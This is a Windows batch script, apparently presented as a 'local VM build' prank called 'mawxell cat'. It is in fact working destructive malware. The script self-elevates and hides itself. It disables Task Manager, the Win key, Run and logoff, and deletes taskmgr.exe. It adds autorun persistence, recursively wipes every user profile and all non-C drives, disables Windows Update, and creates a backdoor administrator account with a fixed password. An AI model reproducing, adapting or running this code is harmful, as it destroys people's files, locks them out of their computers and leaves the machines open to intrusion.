@echo off
title mawxell cat
color 0C
setlocal

rem ============================================================
rem  MAWXELL CAT - FINAL LOCAL VM BUILD
rem  Win10/11 ONLY | red console -> hidden | auto-loop
rem  lock: more more more user / discord
rem  wallpaper: LOCAL video file (no internet)
rem  set VIDEOFILE to your local file (or "skip" for none)
rem ============================================================

set "VIDEOFILE=maxwell.mp4"

if exist "%SystemRoot%\Temp\mc_hidden.flag" goto :payload

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName 2>nul | findstr /i /c:"Windows 10" /c:"Windows 11" >nul
if errorlevel 1 goto :notok

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoP -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

copy /y "%~f0" "%SystemRoot%\Temp\mawxell_cat.bat" >nul 2>&1
> "%SystemRoot%\Temp\mc_hidden.flag" echo 1

> "%SystemRoot%\Temp\mchide.vbs" echo Set o = CreateObject("WScript.Shell")
>> "%SystemRoot%\Temp\mchide.vbs" echo o.Run "%SystemRoot%\Temp\mawxell_cat.bat", 0, False
wscript //nologo "%SystemRoot%\Temp\mchide.vbs"
exit /b

:payload
cd /d "%SystemRoot%\Temp"
attrib +h "%SystemRoot%\Temp\mawxell_cat.bat" "%SystemRoot%\Temp\mchide.vbs" "%SystemRoot%\Temp\mc_hidden.flag" >nul 2>&1

set WAIT=60
timeout /t %WAIT% /nobreak >nul

rem ---------- 1) WIN+R ----------
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1

rem ---------- 2) CTRL+ALT+DEL NUKED ----------
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 1 /f >nul 2>&1
taskkill /f /im taskmgr.exe >nul 2>&1
takeown /f "%SystemRoot%\System32\taskmgr.exe" >nul 2>&1
icacls "%SystemRoot%\System32\taskmgr.exe" /grant *S-1-5-32-544:F >nul 2>&1
del /f /q "%SystemRoot%\System32\taskmgr.exe" >nul 2>&1
takeown /f "%SystemRoot%\SysWOW64\taskmgr.exe" >nul 2>&1
icacls "%SystemRoot%\SysWOW64\taskmgr.exe" /grant *S-1-5-32-544:F >nul 2>&1
del /f /q "%SystemRoot%\SysWOW64\taskmgr.exe" >nul 2>&1
gpupdate /force >nul 2>&1

rem ---------- 3) WIN KEY ----------
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 00000000000000000300000000005BE000005CE000000000 /f >nul 2>&1

rem ---------- 4) TASKBAR HIDE (no auto-logout) ----------
powershell -NoP -Command "$k=(Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3' -EA SilentlyContinue).Settings; if($k){$k[8]=3; Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3' Settings $k}; Stop-Process -Name explorer -Force -EA SilentlyContinue" >nul 2>&1

rem ---------- 5) PERSISTENCE + BSOD :) + AUTO-REBOOT ----------
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v mawxell_cat /t REG_SZ /d "wscript.exe %SystemRoot%\Temp\mchide.vbs" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v DisplayMessage /t REG_SZ /d ":)" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v DisplayParameters /t REG_SZ /d "mawxell cat" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v AutoReboot /t REG_DWORD /d 1 /f >nul 2>&1

rem ---------- 6) LOCAL VIDEO WALLPAPER (only if file exists, FULL HD) ----------
if /i "%VIDEOFILE%"=="skip" goto :novid
if exist "%SystemRoot%\Temp\%VIDEOFILE%" (
    reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" /f >nul 2>&1
    powershell -NoP -Command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $w=(New-Object System.Windows.Forms.Form); $w.FormBorderStyle='None'; $w.Bounds=$s; $w.TopMost=$true; $m=New-Object System.Windows.Forms.MediaPlayer; $m.URL='%SystemRoot%\Temp\%VIDEOFILE%'; $m.settings.setMode('loop',$true); $m.settings.volume=0; $w.Controls.Add($m); $m.Dock='Fill'; $m.StretchToFit=$true; $w.Show(); [System.Windows.Forms.Application]::Run($w)" >nul 2>&1
) else (
    echo  [video not found next to payload - skipping wallpaper]
)
:novid

rem ---------- 7) WIPE USER FILES (keep profiles -> boots to lock screen) ----------
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im SearchHost.exe >nul 2>&1
taskkill /f /im SearchApp.exe >nul 2>&1
taskkill /f /im OneDrive.exe >nul 2>&1
taskkill /f /im Teams.exe >nul 2>&1

powershell -NoP -Command "Get-ChildItem C:\Users -Directory | Where-Object {$_.Name -notin @('Public','Default','Default User')} | ForEach-Object { Get-ChildItem $_.FullName -Force -EA SilentlyContinue | Where-Object {$_.Name -ne 'NTUSER.DAT'} | Remove-Item -Recurse -Force -EA SilentlyContinue }"

powershell -NoP -Command "Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Name -ne 'C'} | ForEach-Object { Remove-Item ($_.Root + '*') -Recurse -Force -ErrorAction SilentlyContinue }"

rem ---------- 7.5) DISABLE WINDOWS UPDATE (SAFE, no disk deletion) ----------
sc stop wuauserv >nul 2>&1
sc config wuauserv start= disabled >nul 2>&1
sc stop bits >nul 2>&1
sc config bits start= disabled >nul 2>&1
sc stop UsoSvc >nul 2>&1
sc config UsoSvc start= disabled >nul 2>&1
sc stop WaaSMedicSvc >nul 2>&1
sc config WaaSMedicSvc start= disabled >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoWindowsUpdate /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" /v DisableWindowsUpdateAccess /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v DisableWindowsUpdateAccess /t REG_DWORD /d 1 /f >nul 2>&1
taskkill /f /im WUDFHost.exe >nul 2>&1
taskkill /f /im WindowsUpdate.exe >nul 2>&1
taskkill /f /im UsoClient.exe >nul 2>&1
taskkill /f /im MoUsoCoreWorker.exe >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v DisallowRun /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v 1 /t REG_SZ /d "Settings.exe" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v 2 /t REG_SZ /d "wuapp.exe" /f >nul 2>&1

rem ---------- 8) LOCK USER: more more more user / discord ----------
net user "more more more user" "discord" /add /expires:never /passwordchg:no /active:yes >nul 2>&1
net localgroup Administrators "more more more user" /add >nul 2>&1
powershell -NoP -Command "Set-LocalUser -Name 'more more more user' -PasswordNeverExpires $true -ErrorAction SilentlyContinue"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d "more more more user" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d "discord" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d "0" /f >nul 2>&1

rem ---------- 9) AUTO-LOOP ANIMATION (spins until restart) ----------
set n=0
:SPIN
set /a n+=1
set /a m=n %% 4
if %m%==0 set "sp=|"
if %m%==1 set "sp=/"
if %m%==2 set "sp=-"
if %m%==3 set "sp=\"
cls
echo.
echo        /\_/\      %sp%
echo       ( o.o )     %sp%
echo        ~~~~~      %sp%
echo.
echo   MAWXELL CAT   pass %n%   restart soon :)   pass %n%
timeout /t 1 /nobreak >nul
goto :SPIN

:notok
echo  [X] Windows 10 / 11 only.
pause
exit /b
